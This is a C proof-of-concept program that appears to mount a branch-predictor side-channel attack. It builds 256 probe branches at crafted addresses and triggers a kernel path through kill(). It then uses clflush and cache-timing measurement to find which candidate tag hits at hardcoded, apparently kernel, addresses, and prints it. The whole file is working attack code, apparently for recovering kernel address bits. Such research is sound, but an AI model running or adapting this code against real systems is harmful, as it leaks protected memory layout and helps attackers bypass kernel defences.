#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <signal.h>

#include "../src/bunnyhop.h"

#include <mastik/low.h>
#include <mastik/util.h>
#include <assemblyline.h>

#define THRESHOLD 50 // The cache miss threshold is various from processors
#define PAGEMASK 0xFFFULL
#define MASK32 0xFFFFFFFFULL
#define memory_barrier asm volatile ("sfence;\nmfence;\nlfence");

uint64_t branch_adrs = 0x810d192bULL;
uint64_t branch_target = 0x810d15d0ULL;

int main(int arg, char* argv[])
{
#if 1
  uint64_t bb = atoi(argv[1]);
  if (bb == 1) {
    branch_adrs |= (1ULL << 21);
    branch_target |= (1ULL << 21);
  } else {
    branch_adrs &= ~(1ULL << 21);
    branch_target &= ~(1ULL << 21);
  }
#endif

  srand(time(NULL));
  uint64_t br_tag_base = (branch_adrs >> 14) & 0xFF;
  uint64_t ta_tag_base = (branch_target >> 14) & 0xFF;
  int bit_rand = 0;
  void (*branch_probe[256])();
  uint64_t monitor_adrs[256] = {0};

  for (int i = 0; i < 256; i++) {
    br_tag_base = (branch_adrs >> 14) & 0xFF;
    ta_tag_base = (branch_target >> 14) & 0xFF;
    uint64_t probe_lower = ((branch_adrs & MASK32) & 0xC03FFFFFULL) | (((br_tag_base ^ (i%256))&0xFFULL) << 22);
    uint64_t probe_adrs = ((uint64_t)random() << 32) | probe_lower;
    branch_probe[i] = genspy(probe_adrs, PAGEMASK << 1, 32);
    uint64_t target_lower = ((branch_target & MASK32) & 0xC03FFFFFULL) | (((ta_tag_base ^ (i%256))&0xFFULL) << 22);
    monitor_adrs[i] = ((uint64_t)branch_probe[i] & (~MASK32)) | target_lower;
  }
  
  // Invoke branch
  kill(-10, SIGKILL);
  memory_barrier

  for (int i = 0; i < 256; i++)
  {
    clflush((void*)monitor_adrs[i]);
    memory_barrier
    
    kill(-10, SIGKILL);
    memory_barrier
    
    branch_probe[i]();
    asm volatile (".rep 25;\nmfence;\nsfence;\nlfence;\n.endr;");

    int res = memaccesstime((void*)monitor_adrs[i]);
    //printf("%3d, %4d, %4d, 0x%lx, 0x%lx, 0x%lx\n", i, res, res2, monitor_adrs[i] & MASK32, monitor_adrs[i+256] & MASK32, (uint64_t)branch_probe[i] & MASK32);
    bhfree(branch_probe[i], PAGEMASK << 1);
    if (res < THRESHOLD) {
      bit_rand = i;
      printf("%d\n", bit_rand);
      printf("%llx\n", (uint64_t)branch_probe[bit_rand] & MASK32);
      break;
    }
  }

}
